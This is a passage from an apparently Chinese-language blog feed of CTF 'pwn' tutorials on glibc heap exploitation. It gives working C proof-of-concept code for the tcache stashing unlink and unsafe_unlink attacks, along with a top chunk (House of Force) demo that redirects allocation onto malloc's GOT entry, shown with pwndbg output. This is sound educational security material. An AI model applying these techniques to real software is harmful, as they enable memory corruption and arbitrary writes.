class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p>关于smallbin的攻击，必须有至少一次calloc()分配</p>
<ol>
<li>申请 9 个 chunk，释放chunk3 - chunk8 和chunk1，他们会被放入 tcache bin中。然后再释放 chunk0 和 chunk2，会被放入 unsortedbin中（连着释放7个会被合并）；</li>
<li>申请一个 大于 上述 chunk size (0x90)的chunk，unsortedbin 中的chunk0 和 chunk2 会被放入 small bin中；</li>
<li>申请两个 tcache，此时 tcache 中的 剩余 chunk数量 为 5 个；</li>
<li>修改 chunk 2 的 <strong>bk指针</strong> 指向我们伪造的内存地址 chunk，<u>该内存地址的chunk 的 bk 指针要为一个 可写入的地址</u>；</li>
</ol>
<p>此时smallbin bk处如：<code>BK: 0x564523298290(chunk 0) —▸ 0x5645232983d0(chunk2) —▸ 0x7fff26072120 —▸ 0x7fff26072130 ◂— 0</code></p>
<ol start="5">
<li><p>调用 calloc() 申请 与tcache 同大小的 chunk，会直接从 small bin中 取 chunk0；</p>
</li>
<li><p>此时small bin 中剩余的 chunk2-&gt; fake chunk，会<strong>从后向前 加入</strong> tcache中，而且由于此时tcache 仅剩2个空余，所以只会遍历到 fake chunk就会结束。</p>
</li>
<li><p>经过上述操作后，此时 tcache链中 第一个 chunk 是 fake chunk，我们取出即可。</p>
</li>
</ol>
<h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><p>向任意地址写入libc地址，任意地址分配</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242L</span>L;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242L</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>malloc_size &#x3D; 0x420;要足够大不使用tcache和fastbin</p>
<p>chunk0_ptr &#x3D; malloc(malloc_size)<br>		chunk1_ptr &#x3D; malloc(malloc_size)</p>
<p>接着我们再chunk0里伪造一个fake_chunk</p>
<p>size&#x3D;chunk1_ptr的size-0x10<br>		fd&#x3D;chunk0_ptr的地址-0x18<br>		bk&#x3D;chunk0_ptr的地址-0x10<br>（特别注意这里是chunk0_ptr地址，地址上存的才是堆的地址）</p>
<p>现在假设chunk0中存在溢出，我们可以随意改chunk1的值，接着我们改chunk1的prev_size为0x420，size的use位设为0</p>
<p>然后我们释放chunk1，就能触发unlink，向后合并</p>
<p>现在chunk0的指针指向自己了</p>
<p>然后我们可以通过释放这个指针两次doublefree造成任意地址写任意值</p>
<p>（不过libc2.32就有新的防御，新的防御机制-safe-linking(异或加密),其核心思想是:将指针的地址右移12位再和指针本身异或，这种unlink用不了啦</p>
<h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-14"><a href="#利用效果-14" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Top chunk attack</title>
    <url>/2025/04/09/top%20chunk%20atttack/</url>
    <content><![CDATA[<h1 id="了解-Top-chunk"><a href="#了解-Top-chunk" class="headerlink" title="了解 Top chunk"></a>了解 Top chunk</h1><p>这是top chunk分配的源码（glibc2.23 malloc.c 3790行左右）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//*</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//*</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>从glibc里的malloc源代码里也可以看到top chunk的切割过程，在bins里没有合适chunk的情况下，如果top chunk的size大于请求的size + MINSIZE，就可以从top chunk里进行切割。</p>
<p>如果top chunk不够分割，则调用sysmalloc进行内存分配，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进sysmalloc()</p>
<p>首先，它会检测申请的内存是否大于mmap的分配阈值，如果大于则用mmap进行分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">    <span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>否则扩充 top chunk 以便从中切割</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">old_heap = heap_for_ptr (old_top);</span><br><span class="line">old_heap_size = old_heap-&gt;size;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">    &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    set_head (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">              | PREV_INUSE);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br></pre></td></tr></table></figure>

<p>如果不满足top chunk扩充的条件的话，old_top_chunk会被free掉，向系统批发新的top_chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">    heap-&gt;ar_ptr = av;</span><br><span class="line">    heap-&gt;prev = old_heap;</span><br><span class="line">    av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">    arena_mem += heap-&gt;size;</span><br><span class="line">    <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">    top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">    set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">       MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">    <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">       become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">       up, too, although the chunk is marked in use. */</span></span><br><span class="line">    old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">    set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= MINSIZE)<span class="comment">//*</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">        set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">        _int_free (av, old_top, <span class="number">1</span>);<span class="comment">//*</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br></pre></td></tr></table></figure>

<h1 id="从源码分析top-chunk-attack"><a href="#从源码分析top-chunk-attack" class="headerlink" title="从源码分析top chunk attack"></a>从源码分析top chunk attack</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#libc-2.23中malloc源码第3793-3809行</span></span><br><span class="line">	  victim = av-&gt;top;<span class="comment">//获取当前top_chunk</span></span><br><span class="line">      size = chunksize (victim);<span class="comment">//计算top_chunk的大小</span></span><br><span class="line">	 <span class="comment">// 如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;<span class="comment">//top_chunk指针更新</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">chunk_at_offset (victim, nb)的宏定义（代码第<span class="number">1312</span><span class="number">-1313</span>行）</span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);<span class="comment">//更新top_chunk_size</span></span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这是_int_malloc()源码中调用top chunk的部分，注意到<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>在进行比较时用的是unsigned long。如果程序存存在溢出等漏洞可以将top chunk的size修改，就可以得到漏洞利用。例如将size修改为-1(0xffffffffffffffff)，那么这将使得从top chunk地址开始后所有的内存都被包含在了top chunk里，可以被自由切割。</p>
<p>而且呢top chunk的位置移动仅进行了地址的位移（即地址的加减运算）</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><h2 id="向前控制内存demo1"><a href="#向前控制内存demo1" class="headerlink" title="向前控制内存demo1"></a>向前控制内存demo1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o demo1 demo1.c  ubuntu 16.04</span></span><br></pre></td></tr></table></figure>

<p>在执行过第7行后，top_chunk的size被修改，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0xffffffffffffffff &lt;== top_chunk size = -1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过malloc(-4120)，为什么时-4120?</p>
<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/ctf/pwn/demo1:</span><br><span class="line">GOT protection: Partial RELRO | Found 2 GOT entries passing the filter</span><br><span class="line">[0x601018] __libc_start_main@GLIBC_2.2.5 -&gt; 0x7ffff7a2d750 (__libc_start_main) ◂— push r14</span><br><span class="line">[0x601020] malloc@GLIBC_2.2.5 -&gt; 0x7ffff7a91180 (malloc) ◂— push rbp</span><br><span class="line">pwndbg&gt; distance 0x602020 0x601010</span><br><span class="line">0x602020-&gt;0x601010 is -0x1010 bytes (-0x202 words)</span><br><span class="line">pwndbg&gt; p  -0x1010</span><br><span class="line"><span class="variable">$1</span> = -4112 </span><br></pre></td></tr></table></figure>

<p> 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址。</p>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移 -4112</p>
<p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了<strong>无符号整数</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__libc_malloc(<span class="type">size_t</span> bytes) &#123;</span><br></pre></td></tr></table></figure>

<p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           